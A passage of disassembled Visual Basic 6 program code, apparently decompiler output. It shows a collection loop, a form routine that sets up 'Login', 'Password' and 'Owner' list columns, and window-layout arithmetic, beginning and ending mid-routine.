008D58AF: lea eax, var_48
008D58B2: push eax
008D58B3: push 00000003h
008D58B5: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008D58BA: add esp, 00000010h
008D58BD: mov var_04, 00000009h
008D58C4: jmp 008D55CFh
008D58C9: jmp 008D5C9Ah
008D58CE: mov var_04, 0000000Bh
008D58D5: cmp [008F2010h], 00000000h
008D58DC: jnz 8D58F9h
008D58DE: push 008F2010h
008D58E3: push 00433984h
008D58E8: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
008D58ED: mov var_000000DC, 008F2010h
008D58F7: jmp 8D5903h
008D58F9: mov var_000000DC, 008F2010h
008D5903: push 00000000h
008D5905: push 00000001h
008D5907: push 00440E48h
008D590C: push 00000000h
008D590E: push 00000018h
008D5910: mov eax, var_000000DC
008D5916: mov eax, [eax]
008D5918: mov ecx, var_000000DC
008D591E: mov ecx, [ecx]
008D5920: mov ecx, [ecx]
008D5922: push eax
008D5923: call [ecx+00000550h]
008D5929: push eax
008D592A: lea eax, var_30
008D592D: push eax
008D592E: call 00410A84h ; Set (object)
008D5933: push eax
008D5934: lea eax, var_48
008D5937: push eax
008D5938: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008D593D: add esp, 00000010h
008D5940: push eax
008D5941: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008D5946: push eax
008D5947: lea eax, var_34
008D594A: push eax
008D594B: call 00410A84h ; Set (object)
008D5950: push eax
008D5951: lea eax, var_58
008D5954: push eax
008D5955: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008D595A: add esp, 00000010h
008D595D: push eax
008D595E: call 00410A90h ; msvbvm60.dll.__vbaI4Var
008D5963: mov var_000000B8, eax
008D5969: mov var_000000B4, 00000001h
008D5973: mov var_24, 00000001h
008D597A: lea eax, var_34
008D597D: push eax
008D597E: lea eax, var_30
008D5981: push eax
008D5982: push 00000002h
008D5984: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008D5989: add esp, 0000000Ch
008D598C: lea eax, var_58
008D598F: push eax
008D5990: lea eax, var_48
008D5993: push eax
008D5994: push 00000002h
008D5996: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008D599B: add esp, 0000000Ch
008D599E: jmp 8D59B2h
008D59A0: mov eax, var_24
008D59A3: add eax, var_000000B4
008D59A9: jo 008D5D13h
008D59AF: mov var_24, eax
008D59B2: mov eax, var_24
008D59B5: cmp eax, var_000000B8
008D59BB: jnle 008D5C9Ah
008D59C1: mov var_04, 0000000Ch
008D59C8: mov eax, var_24
008D59CB: mov var_74, eax
008D59CE: mov var_7C, 00000003h
008D59D5: cmp [008F2010h], 00000000h
008D59DC: jnz 8D59F9h
008D59DE: push 008F2010h
008D59E3: push 00433984h
008D59E8: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
008D59ED: mov var_000000E0, 008F2010h
008D59F7: jmp 8D5A03h
008D59F9: mov var_000000E0, 008F2010h
008D5A03: push 00000000h
008D5A05: push 00000004h
008D5A07: push 00440E58h
008D5A0C: push 00000010h
008D5A0E: pop eax
008D5A0F: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008D5A14: lea esi, var_7C
008D5A17: mov edi, esp
008D5A19: movsd 
008D5A1A: movsd 
008D5A1B: movsd 
008D5A1C: movsd 
008D5A1D: push 00000001h
008D5A1F: push 00000000h
008D5A21: push 00440E48h
008D5A26: push 00000000h
008D5A28: push 00000018h
008D5A2A: mov eax, var_000000E0
008D5A30: mov eax, [eax]
008D5A32: mov ecx, var_000000E0
008D5A38: mov ecx, [ecx]
008D5A3A: mov ecx, [ecx]
008D5A3C: push eax
008D5A3D: call [ecx+00000550h]
008D5A43: push eax
008D5A44: lea eax, var_30
008D5A47: push eax
008D5A48: call 00410A84h ; Set (object)
008D5A4D: push eax
008D5A4E: lea eax, var_48
008D5A51: push eax
008D5A52: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008D5A57: add esp, 00000010h
008D5A5A: push eax
008D5A5B: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008D5A60: push eax
008D5A61: lea eax, var_34
008D5A64: push eax
008D5A65: call 00410A84h ; Set (object)
008D5A6A: push eax
008D5A6B: lea eax, var_58
008D5A6E: push eax
008D5A6F: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008D5A74: add esp, 00000020h
008D5A77: push eax
008D5A78: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008D5A7D: push eax
008D5A7E: lea eax, var_38
008D5A81: push eax
008D5A82: call 00410A84h ; Set (object)
008D5A87: push eax
008D5A88: lea eax, var_68
008D5A8B: push eax
008D5A8C: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008D5A91: add esp, 00000010h
008D5A94: push eax
008D5A95: call 004108C8h ; msvbvm60.dll.__vbaBoolVar
008D5A9A: sub ax, FFFFh
008D5A9E: neg ax
008D5AA1: sbb eax, eax
008D5AA3: inc eax
008D5AA4: neg eax
008D5AA6: mov var_000000A8, ax
008D5AAD: lea eax, var_38
008D5AB0: push eax
008D5AB1: lea eax, var_34
008D5AB4: push eax
008D5AB5: lea eax, var_30
008D5AB8: push eax
008D5AB9: push 00000003h
008D5ABB: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008D5AC0: add esp, 00000010h
008D5AC3: lea eax, var_68
008D5AC6: push eax
008D5AC7: lea eax, var_58
008D5ACA: push eax
008D5ACB: lea eax, var_48
008D5ACE: push eax
008D5ACF: push 00000003h
008D5AD1: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008D5AD6: add esp, 00000010h
008D5AD9: movsx eax, word ptr var_000000A8
008D5AE0: test eax, eax
008D5AE2: jz 008D5C8Eh
008D5AE8: mov var_04, 0000000Dh
008D5AEF: mov eax, var_24
008D5AF2: mov var_74, eax
008D5AF5: mov var_7C, 00000003h
008D5AFC: cmp [008F2010h], 00000000h
008D5B03: jnz 8D5B20h
008D5B05: push 008F2010h
008D5B0A: push 00433984h
008D5B0F: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
008D5B14: mov var_000000E4, 008F2010h
008D5B1E: jmp 8D5B2Ah
008D5B20: mov var_000000E4, 008F2010h
008D5B2A: push 00000000h
008D5B2C: push 00000014h
008D5B2E: push 00440E58h
008D5B33: push 00000010h
008D5B35: pop eax
008D5B36: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008D5B3B: lea esi, var_7C
008D5B3E: mov edi, esp
008D5B40: movsd 
008D5B41: movsd 
008D5B42: movsd 
008D5B43: movsd 
008D5B44: push 00000001h
008D5B46: push 00000000h
008D5B48: push 00440E48h
008D5B4D: push 00000000h
008D5B4F: push 00000018h
008D5B51: mov eax, var_000000E4
008D5B57: mov eax, [eax]
008D5B59: mov ecx, var_000000E4
008D5B5F: mov ecx, [ecx]
008D5B61: mov ecx, [ecx]
008D5B63: push eax
008D5B64: call [ecx+00000550h]
008D5B6A: push eax
008D5B6B: lea eax, var_30
008D5B6E: push eax
008D5B6F: call 00410A84h ; Set (object)
008D5B74: push eax
008D5B75: lea eax, var_48
008D5B78: push eax
008D5B79: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008D5B7E: add esp, 00000010h
008D5B81: push eax
008D5B82: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008D5B87: push eax
008D5B88: lea eax, var_34
008D5B8B: push eax
008D5B8C: call 00410A84h ; Set (object)
008D5B91: push eax
008D5B92: lea eax, var_58
008D5B95: push eax
008D5B96: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008D5B9B: add esp, 00000020h
008D5B9E: push eax
008D5B9F: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008D5BA4: push eax
008D5BA5: lea eax, var_38
008D5BA8: push eax
008D5BA9: call 00410A84h ; Set (object)
008D5BAE: push eax
008D5BAF: lea eax, var_68
008D5BB2: push eax
008D5BB3: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008D5BB8: add esp, 00000010h
008D5BBB: push eax
008D5BBC: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
008D5BC1: mov edx, eax
008D5BC3: lea ecx, var_28
008D5BC6: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008D5BCB: push eax
008D5BCC: call 004109DCh ; Val(arg_1)
008D5BD1: fstp real8 ptr var_000000A4
008D5BD7: push 00000000h
008D5BD9: push 00000000h
008D5BDB: push 00000001h
008D5BDD: push 00000000h
008D5BDF: lea eax, var_6C
008D5BE2: push eax
008D5BE3: push 00000010h
008D5BE5: push 00000880h
008D5BEA: call 00410946h ; ReDim
008D5BEF: add esp, 0000001Ch
008D5BF2: mov var_00000094, 00442938h
008D5BFC: mov var_0000009C, 00000008h
008D5C06: lea esi, var_0000009C
008D5C0C: push 00000000h
008D5C0E: push var_6C
008D5C11: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
008D5C16: mov ecx, eax
008D5C18: mov edx, esi
008D5C1A: call 004108F2h ; msvbvm60.dll.__vbaVarCopy
008D5C1F: mov edx, 0043DA70h ; x126
008D5C24: lea ecx, var_2C
008D5C27: call 00410A6Ch ; msvbvm60.dll.__vbaStrCopy
008D5C2C: lea eax, var_6C
008D5C2F: push eax
008D5C30: lea eax, var_2C
008D5C33: push eax
008D5C34: fld real8 ptr var_000000A4
008D5C3A: call 004108E6h ; msvbvm60.dll.__vbaFpI2
008D5C3F: push eax
008D5C40: call 007A6910h
008D5C45: lea eax, var_6C
008D5C48: push eax
008D5C49: push 00000000h
008D5C4B: call 00410934h ; Erase
008D5C50: lea eax, var_2C
008D5C53: push eax
008D5C54: lea eax, var_28
008D5C57: push eax
008D5C58: push 00000002h
008D5C5A: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
008D5C5F: add esp, 0000000Ch
008D5C62: lea eax, var_38
008D5C65: push eax
008D5C66: lea eax, var_34
008D5C69: push eax
008D5C6A: lea eax, var_30
008D5C6D: push eax
008D5C6E: push 00000003h
008D5C70: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008D5C75: add esp, 00000010h
008D5C78: lea eax, var_68
008D5C7B: push eax
008D5C7C: lea eax, var_58
008D5C7F: push eax
008D5C80: lea eax, var_48
008D5C83: push eax
008D5C84: push 00000003h
008D5C86: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008D5C8B: add esp, 00000010h
008D5C8E: mov var_04, 0000000Fh
008D5C95: jmp 008D59A0h
008D5C9A: mov var_10, 00000000h
008D5CA1: wait 
008D5CA2: push 008D5CF4h
008D5CA7: jmp 8D5CF3h
008D5CA9: lea eax, var_2C
008D5CAC: push eax
008D5CAD: lea eax, var_28
008D5CB0: push eax
008D5CB1: push 00000002h
008D5CB3: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
008D5CB8: add esp, 0000000Ch
008D5CBB: lea eax, var_38
008D5CBE: push eax
008D5CBF: lea eax, var_34
008D5CC2: push eax
008D5CC3: lea eax, var_30
008D5CC6: push eax
008D5CC7: push 00000003h
008D5CC9: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008D5CCE: add esp, 00000010h
008D5CD1: lea eax, var_68
008D5CD4: push eax
008D5CD5: lea eax, var_58
008D5CD8: push eax
008D5CD9: lea eax, var_48
008D5CDC: push eax
008D5CDD: push 00000003h
008D5CDF: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008D5CE4: add esp, 00000010h
008D5CE7: lea eax, var_6C
008D5CEA: push eax
008D5CEB: push 00000000h
008D5CED: call 0041092Eh ; msvbvm60.dll.__vbaAryDestruct
008D5CF2: ret 
End Sub

Private sub Form__8D65B0
008D65B0: push ebp
008D65B1: mov ebp, esp
008D65B3: sub esp, 0000000Ch
008D65B6: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
008D65BB: mov eax, fs:[00h]
008D65C1: push eax
008D65C2: mov fs:[00000000h], esp
008D65C9: mov eax, 000000A0h
008D65CE: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008D65D3: push ebx
008D65D4: push esi
008D65D5: push edi
008D65D6: mov var_0C, esp
008D65D9: mov var_08, 0040FCF0h
008D65E0: mov eax, [ebp+08h]
008D65E3: and eax, 00000001h
008D65E6: mov var_04, eax
008D65E9: mov eax, [ebp+08h]
008D65EC: and al, FEh
008D65EE: mov [ebp+08h], eax
008D65F1: mov eax, [ebp+08h]
008D65F4: mov eax, [eax]
008D65F6: push [ebp+08h]
008D65F9: call [eax+04h]
008D65FC: mov var_34, 80020004h
008D6603: mov var_3C, 0000000Ah
008D660A: mov var_54, 80020004h
008D6611: mov var_5C, 0000000Ah
008D6618: mov var_74, 0044D744h ; Login
008D661F: mov var_7C, 00000008h
008D6626: mov var_00000094, 00000BB8h
008D6630: mov var_0000009C, 00000002h
008D663A: push 00000010h
008D663C: pop eax
008D663D: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008D6642: lea esi, var_3C
008D6645: mov edi, esp
008D6647: movsd 
008D6648: movsd 
008D6649: movsd 
008D664A: movsd 
008D664B: push 00000010h
008D664D: pop eax
008D664E: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008D6653: lea esi, var_5C
008D6656: mov edi, esp
008D6658: movsd 
008D6659: movsd 
008D665A: movsd 
008D665B: movsd 
008D665C: push 00000010h
008D665E: pop eax
008D665F: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008D6664: lea esi, var_7C
008D6667: mov edi, esp
008D6669: movsd 
008D666A: movsd 
008D666B: movsd 
008D666C: movsd 
008D666D: push 00000010h
008D666F: pop eax
008D6670: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008D6675: lea esi, var_0000009C
008D667B: mov edi, esp
008D667D: movsd 
008D667E: movsd 
008D667F: movsd 
008D6680: movsd 
008D6681: push 00000004h
008D6683: push 00000002h
008D6685: push 00445534h
008D668A: push 00000000h
008D668C: push 00000019h
008D668E: mov eax, [ebp+08h]
008D6691: mov eax, [eax]
008D6693: push [ebp+08h]
008D6696: call [eax+00000308h]
008D669C: push eax
008D669D: lea eax, var_18
008D66A0: push eax
008D66A1: call 00410A84h ; Set (object)
008D66A6: push eax
008D66A7: lea eax, var_2C
008D66AA: push eax
008D66AB: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008D66B0: add esp, 00000010h
008D66B3: push eax
008D66B4: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008D66B9: push eax
008D66BA: lea eax, var_1C
008D66BD: push eax
008D66BE: call 00410A84h ; Set (object)
008D66C3: push eax
008D66C4: call 00410A2Ah ; msvbvm60.dll.__vbaLateIdCall
008D66C9: add esp, 0000004Ch
008D66CC: lea eax, var_1C
008D66CF: push eax
008D66D0: lea eax, var_18
008D66D3: push eax
008D66D4: push 00000002h
008D66D6: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008D66DB: add esp, 0000000Ch
008D66DE: lea ecx, var_2C
008D66E1: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
008D66E6: mov var_34, 80020004h
008D66ED: mov var_3C, 0000000Ah
008D66F4: mov var_54, 80020004h
008D66FB: mov var_5C, 0000000Ah
008D6702: mov var_74, 004613ECh ; Password
008D6709: mov var_7C, 00000008h
008D6710: mov var_00000094, 00000BB8h
008D671A: mov var_0000009C, 00000002h
008D6724: push 00000010h
008D6726: pop eax
008D6727: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008D672C: lea esi, var_3C
008D672F: mov edi, esp
008D6731: movsd 
008D6732: movsd 
008D6733: movsd 
008D6734: movsd 
008D6735: push 00000010h
008D6737: pop eax
008D6738: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008D673D: lea esi, var_5C
008D6740: mov edi, esp
008D6742: movsd 
008D6743: movsd 
008D6744: movsd 
008D6745: movsd 
008D6746: push 00000010h
008D6748: pop eax
008D6749: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008D674E: lea esi, var_7C
008D6751: mov edi, esp
008D6753: movsd 
008D6754: movsd 
008D6755: movsd 
008D6756: movsd 
008D6757: push 00000010h
008D6759: pop eax
008D675A: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008D675F: lea esi, var_0000009C
008D6765: mov edi, esp
008D6767: movsd 
008D6768: movsd 
008D6769: movsd 
008D676A: movsd 
008D676B: push 00000004h
008D676D: push 00000002h
008D676F: push 00445534h
008D6774: push 00000000h
008D6776: push 00000019h
008D6778: mov eax, [ebp+08h]
008D677B: mov eax, [eax]
008D677D: push [ebp+08h]
008D6780: call [eax+00000308h]
008D6786: push eax
008D6787: lea eax, var_18
008D678A: push eax
008D678B: call 00410A84h ; Set (object)
008D6790: push eax
008D6791: lea eax, var_2C
008D6794: push eax
008D6795: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008D679A: add esp, 00000010h
008D679D: push eax
008D679E: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008D67A3: push eax
008D67A4: lea eax, var_1C
008D67A7: push eax
008D67A8: call 00410A84h ; Set (object)
008D67AD: push eax
008D67AE: call 00410A2Ah ; msvbvm60.dll.__vbaLateIdCall
008D67B3: add esp, 0000004Ch
008D67B6: lea eax, var_1C
008D67B9: push eax
008D67BA: lea eax, var_18
008D67BD: push eax
008D67BE: push 00000002h
008D67C0: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008D67C5: add esp, 0000000Ch
008D67C8: lea ecx, var_2C
008D67CB: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
008D67D0: mov var_34, 80020004h
008D67D7: mov var_3C, 0000000Ah
008D67DE: mov var_54, 80020004h
008D67E5: mov var_5C, 0000000Ah
008D67EC: mov var_74, 004468B4h ; Owner
008D67F3: mov var_7C, 00000008h
008D67FA: mov var_00000094, 00001194h
008D6804: mov var_0000009C, 00000002h
008D680E: push 00000010h
008D6810: pop eax
008D6811: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008D6816: lea esi, var_3C
008D6819: mov edi, esp
008D681B: movsd 
008D681C: movsd 
008D681D: movsd 
008D681E: movsd 
008D681F: push 00000010h
008D6821: pop eax
008D6822: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008D6827: lea esi, var_5C
008D682A: mov edi, esp
008D682C: movsd 
008D682D: movsd 
008D682E: movsd 
008D682F: movsd 
008D6830: push 00000010h
008D6832: pop eax
008D6833: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008D6838: lea esi, var_7C
008D683B: mov edi, esp
008D683D: movsd 
008D683E: movsd 
008D683F: movsd 
008D6840: movsd 
008D6841: push 00000010h
008D6843: pop eax
008D6844: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008D6849: lea esi, var_0000009C
008D684F: mov edi, esp
008D6851: movsd 
008D6852: movsd 
008D6853: movsd 
008D6854: movsd 
008D6855: push 00000004h
008D6857: push 00000002h
008D6859: push 00445534h
008D685E: push 00000000h
008D6860: push 00000019h
008D6862: mov eax, [ebp+08h]
008D6865: mov eax, [eax]
008D6867: push [ebp+08h]
008D686A: call [eax+00000308h]
008D6870: push eax
008D6871: lea eax, var_18
008D6874: push eax
008D6875: call 00410A84h ; Set (object)
008D687A: push eax
008D687B: lea eax, var_2C
008D687E: push eax
008D687F: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008D6884: add esp, 00000010h
008D6887: push eax
008D6888: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008D688D: push eax
008D688E: lea eax, var_1C
008D6891: push eax
008D6892: call 00410A84h ; Set (object)
008D6897: push eax
008D6898: call 00410A2Ah ; msvbvm60.dll.__vbaLateIdCall
008D689D: add esp, 0000004Ch
008D68A0: lea eax, var_1C
008D68A3: push eax
008D68A4: lea eax, var_18
008D68A7: push eax
008D68A8: push 00000002h
008D68AA: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008D68AF: add esp, 0000000Ch
008D68B2: lea ecx, var_2C
008D68B5: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
008D68BA: mov var_04, 00000000h
008D68C1: push 008D68E4h
008D68C6: jmp 8D68E3h
008D68C8: lea eax, var_1C
008D68CB: push eax
008D68CC: lea eax, var_18
008D68CF: push eax
008D68D0: push 00000002h
008D68D2: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008D68D7: add esp, 0000000Ch
008D68DA: lea ecx, var_2C
008D68DD: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
008D68E2: ret 
End Sub

Private sub Form__8D6903
008D6903: push ebp
008D6904: mov ebp, esp
008D6906: sub esp, 00000018h
008D6909: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
008D690E: mov eax, fs:[00h]
008D6914: push eax
008D6915: mov fs:[00000000h], esp
008D691C: mov eax, 000000E0h
008D6921: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008D6926: push ebx
008D6927: push esi
008D6928: push edi
008D6929: mov var_18, esp
008D692C: mov var_14, 0040FD00h
008D6933: mov eax, [ebp+08h]
008D6936: and eax, 00000001h
008D6939: mov var_10, eax
008D693C: mov eax, [ebp+08h]
008D693F: and al, FEh
008D6941: mov [ebp+08h], eax
008D6944: mov var_0C, 00000000h
008D694B: mov eax, [ebp+08h]
008D694E: mov eax, [eax]
008D6950: push [ebp+08h]
008D6953: call [eax+04h]
008D6956: mov var_04, 00000001h
008D695D: mov var_04, 00000002h
008D6964: push FFFFFFFFh
008D6966: call 00410A60h ; On Error ...
008D696B: mov var_04, 00000003h
008D6972: push 00000000h
008D6974: push 80010006h
008D6979: mov eax, [ebp+08h]
008D697C: mov eax, [eax]
008D697E: push [ebp+08h]
008D6981: call [eax+0000030Ch]
008D6987: push eax
008D6988: lea eax, var_24
008D698B: push eax
008D698C: call 00410A84h ; Set (object)
008D6991: push eax
008D6992: lea eax, var_3C
008D6995: push eax
008D6996: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008D699B: add esp, 00000010h
008D699E: fldz 
008D69A0: fstp real4 ptr var_54
008D69A3: mov var_5C, 00000004h
008D69AA: and var_74, 00000000h
008D69AE: mov var_7C, 00000002h
008D69B5: lea eax, var_000000D0
008D69BB: push eax
008D69BC: mov eax, [ebp+08h]
008D69BF: mov eax, [eax]
008D69C1: push [ebp+08h]
008D69C4: call [eax+00000080h]
008D69CA: fclex 
008D69CC: mov var_000000D8, eax
008D69D2: cmp var_000000D8, 00000000h
008D69D9: jnl 8D69FBh
008D69DB: push 00000080h
008D69E0: push 0044800Ch
008D69E5: push [ebp+08h]
008D69E8: push var_000000D8
008D69EE: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008D69F3: mov var_000000F4, eax
008D69F9: jmp 8D6A02h
008D69FB: and var_000000F4, 00000000h
008D6A02: fld real4 ptr var_000000D0
008D6A08: fsub real4 ptr [00402BA4h]
008D6A0E: fstp real4 ptr var_00000094
008D6A14: fstsw ax
008D6A16: test al, 0Dh
008D6A18: jnz 008D6D21h
008D6A1E: mov var_0000009C, 00000004h
008D6A28: lea eax, var_000000D4
008D6A2E: push eax
008D6A2F: mov eax, [ebp+08h]
008D6A32: mov eax, [eax]
008D6A34: push [ebp+08h]
008D6A37: call [eax+00000088h]
008D6A3D: fclex 
008D6A3F: mov var_000000DC, eax
008D6A45: cmp var_000000DC, 00000000h
008D6A4C: jnl 8D6A6Eh
008D6A4E: push 00000088h
008D6A53: push 0044800Ch
008D6A58: push [ebp+08h]
008D6A5B: push var_000000DC
008D6A61: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008D6A66: mov var_000000F8, eax
008D6A6C: jmp 8D6A75h
008D6A6E: and var_000000F8, 00000000h
008D6A75: lea eax, var_3C
008D6A78: push eax
008D6A79: call 004107EAh ; msvbvm60.dll.__vbaR4Var
008D6A7E: fsubr real4 ptr var_000000D4
008D6A84: fsub real4 ptr [0040DF3Ch]
008D6A8A: fstp real4 ptr var_000000B4
008D6A90: fstsw ax
008D6A92: test al, 0Dh
008D6A94: jnz 008D6D21h
008D6A9A: mov var_000000BC, 00000004h
008D6AA4: push 00000010h
008D6AA6: pop eax
008D6AA7: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008D6AAC: lea esi, var_5C
008D6AAF: mov edi, esp
008D6AB1: movsd 
008D6AB2: movsd 
008D6AB3: movsd 
008D6AB4: movsd 
008D6AB5: push 00000010h
008D6AB7: pop eax
008D6AB8: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008D6ABD: lea esi, var_7C
008D6AC0: mov edi, esp
008D6AC2: movsd 
008D6AC3: movsd 
008D6AC4: movsd 
008D6AC5: movsd 
008D6AC6: push 00000010h
008D6AC8: pop eax
008D6AC9: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008D6ACE: lea esi, var_0000009C
008D6AD4: mov edi, esp
008D6AD6: movsd 
008D6AD7: movsd 
008D6AD8: movsd 
008D6AD9: movsd 
008D6ADA: push 00000010h
008D6ADC: pop eax
008D6ADD: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008D6AE2: lea esi, var_000000BC
008D6AE8: mov edi, esp
008D6AEA: movsd 
008D6AEB: movsd 
008D6AEC: movsd 
008D6AED: movsd 
008D6AEE: push 00000004h
008D6AF0: push 80011002h
008D6AF5: mov eax, [ebp+08h]
008D6AF8: mov eax, [eax]
008D6AFA: push [ebp+08h]
008D6AFD: call [eax+00000308h]
008D6B03: push eax
008D6B04: lea eax, var_28
008D6B07: push eax
008D6B08: call 00410A84h ; Set (object)
008D6B0D: push eax
008D6B0E: call 00410A2Ah ; msvbvm60.dll.__vbaLateIdCall
008D6B13: add esp, 0000004Ch
008D6B16: lea eax, var_28
008D6B19: push eax
008D6B1A: lea eax, var_24
008D6B1D: push eax
008D6B1E: push 00000002h
008D6B20: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008D6B25: add esp, 0000000Ch
008D6B28: lea ecx, var_3C
008D6B2B: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
008D6B30: mov var_04, 00000004h
008D6B37: push 00000000h
008D6B39: push 80010006h
008D6B3E: mov eax, [ebp+08h]
008D6B41: mov eax, [eax]
008D6B43: push [ebp+08h]
008D6B46: call [eax+00000308h]
008D6B4C: push eax
008D6B4D: lea eax, var_28
008D6B50: push eax
008D6B51: call 00410A84h ; Set (object)
008D6B56: push eax
008D6B57: lea eax, var_4C
008D6B5A: push eax
008D6B5B: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008D6B60: add esp, 00000010h
008D6B63: fldz 
008D6B65: fstp real4 ptr var_54
008D6B68: mov var_5C, 00000004h
008D6B6F: push 00000000h
008D6B71: push 80010004h
008D6B76: mov eax, [ebp+08h]
008D6B79: mov eax, [eax]
008D6B7B: push [ebp+08h]
008D6B7E: call [eax+00000308h]
008D6B84: push eax
008D6B85: lea eax, var_24
008D6B88: push eax
008D6B89: call 00410A84h ; Set (object)
008D6B8E: push eax
008D6B8F: lea eax, var_3C
008D6B92: push eax
008D6B93: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008D6B98: add esp, 00000010h
008D6B9B: push eax
008D6B9C: call 004107EAh ; msvbvm60.dll.__vbaR4Var
008D6BA1: fstp real4 ptr var_000000FC
008D6BA7: lea eax, var_4C
008D6BAA: push eax
008D6BAB: call 004107EAh ; msvbvm60.dll.__vbaR4Var
008D6BB0: fadd real4 ptr var_000000FC
008D6BB6: fadd real4 ptr [00402BA8h]
008D6BBC: fstp real4 ptr var_74
008D6BBF: fstsw ax
008D6BC1: test al, 0Dh
008D6BC3: jnz 008D6D21h
008D6BC9: mov var_7C, 00000004h
008D6BD0: lea eax, var_000000D0
008D6BD6: push eax
008D6BD7: mov eax, [ebp+08h]
008D6BDA: mov eax, [eax]
008D6BDC: push [ebp+08h]
008D6BDF: call [eax+00000080h]
008D6BE5: fclex 
008D6BE7: mov var_000000D8, eax
008D6BED: cmp var_000000D8, 00000000h
008D6BF4: jnl 8D6C16h
008D6BF6: push 00000080h
008D6BFB: push 0044800Ch
008D6C00: push [ebp+08h]
008D6C03: push var_000000D8
008D6C09: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008D6C0E: mov var_00000100, eax
008D6C14: jmp 8D6C1Dh
008D6C16: and var_00000100, 00000000h
008D6C1D: fld real4 ptr var_000000D0
008D6C23: fsub real4 ptr [00402BA4h]
008D6C29: fstp real4 ptr var_00000094
008D6C2F: fstsw ax
008D6C31: test al, 0Dh
008D6C33: jnz 008D6D21h
008D6C39: mov var_0000009C, 00000004h
008D6C43: push 00000010h
008D6C45: pop eax
008D6C46: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008D6C4B: lea esi, var_5C
008D6C4E: mov edi, esp
008D6C50: movsd 
008D6C51: movsd 
008D6C52: movsd 
008D6C53: movsd 
008D6C54: push 00000010h
008D6C56: pop eax
008D6C57: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008D6C5C: lea esi, var_7C
008D6C5F: mov edi, esp
008D6C61: movsd 
008D6C62: movsd 
008D6C63: movsd 
008D6C64: movsd 
008D6C65: push 00000010h
008D6C67: pop eax
008D6C68: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008D6C6D: lea esi, var_0000009C
008D6C73: mov edi, esp
008D6C75: movsd 
008D6C76: movsd 
008D6C77: movsd 
008D6C78: movsd 
008D6C79: push 00000003h
008D6C7B: push 80011001h
008D6C80: mov eax, [ebp+08h]
008D6C83: mov eax, [eax]
008D6C85: push [ebp+08h]
008D6C88: call [eax+0000030Ch]
008D6C8E: push eax
008D6C8F: lea eax, var_2C
008D6C92: push eax
008D6C93: call 00410A84h ; Set (object)
008D6C98: push eax
008D6C99: call 00410A2Ah ; msvbvm60.dll.__vbaLateIdCall
008D6C9E: add esp, 0000003Ch
